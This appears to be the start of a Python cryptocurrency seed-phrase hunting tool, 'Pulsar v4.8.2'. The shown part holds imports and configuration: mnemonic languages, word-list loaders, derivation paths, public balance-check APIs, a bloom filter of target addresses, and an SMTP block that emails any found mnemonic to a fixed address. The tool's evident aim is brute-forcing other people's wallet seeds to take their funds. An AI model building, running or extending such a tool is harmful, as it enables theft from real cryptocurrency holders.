# #!/usr/bin/python3
# encoding=utf8
# -*- coding: utf-8 -*-
"""
@author: Noname400
"""

from bloomfilter import BloomFilter
import platform, os, sys, ctypes, random, time, argparse, multiprocessing
import smtplib, datetime, socket, hashlib, secrets
from mnemonic import Mnemonic
from multiprocessing import  Value, Lock, Process
from bip32 import BIP32
import requests
from colorama import Fore, Back, Style, init
import secp256k1_lib
init()


class Counter(object):
    def __init__(self, initval=0):
        self.val = Value(ctypes.c_int, initval)
        self.lock = Lock()
    def increment(self):
        with self.lock:
            self.val.value += 1
    def value(self):
        with self.lock:
            return self.val.value

class email:
    host:str = "smtp.timeweb.ru" # SMTP server
    port:int = 25
    password:str = 'you password HERE'
    subject:str = '--- Find Mnemonic ---'
    to_addr:str = 'hunt@quadrotech.ru'
    from_addr:str = 'hunt@quadrotech.ru'
    desc:str = ''

class inf:
    def load_r2():
        f = open('wl/r2_en.txt','r')
        l = [line.strip() for line in f]
        f.close()
        return l
    def load_game():    
        f = open('wl/game_en.txt','r')
        l = [line.strip() for line in f]
        f.close()
        return l
    def load_custom(custom_file):    
        f = open(custom_file,'r')
        l = [line.strip() for line in f]
        f.close()
        return l
    version:str = '* Pulsar v4.8.2 multiT Hash160 *'
    mnemonic_lang:list = ['english', 'chinese_simplified'] # ['english', 'chinese_simplified', 'chinese_traditional', 'french', 'italian', 'spanish', 'korean','japanese','portuguese','czech']
    balance:bool = False
    bal_err:int = 0
    bip:str = '32'
    bal_server:list = ['https://api.blockcypher.com/v1/btc/main/addrs/', 'https://rest.bitcoin.com/v2/address/details/', 'https://sochain.com/api/v2/address/BTC/', \
        'https://blockchain.info/rawaddr/']
    ETH_bal_server:list = ['https://api.blockchair.com/ethereum/dashboards/address/','https://api.etherscan.io/api?module=account&action=balance&address=']
    bal_srv_count:int = 0
    bal_all_err = 0
    count:int = 1
    th:int = 1 #number of processes
    th_run:int = 0
    db_bf:str = ''
    dt_now:str = ''
    sleep:int = 3
    work_time:float = 0.0
    mode:str = ''
    mode_text:str = ''
    bit:int = 128
    debug:bool = False
    mail:bool = False
    mail_err:str = 0
    bf:BloomFilter
    custom_dir:str = ''
    custom_words:int = 6
    custom_lang:str = ''
    r2_list:list = []
    game_list:list = []
    custom_list:list = []
    lbtc:list = ['44','49']
    l32:list = ["m/0'/","m/44'/0'/"]
    l32_:list = ["","'"]
    l44:list = ['0'] # ["0","145","236","156","177","222","192","2","3","5","7","8","20","22","28","90","133","147","2301","175","216"]
    leth:list = ['60','61']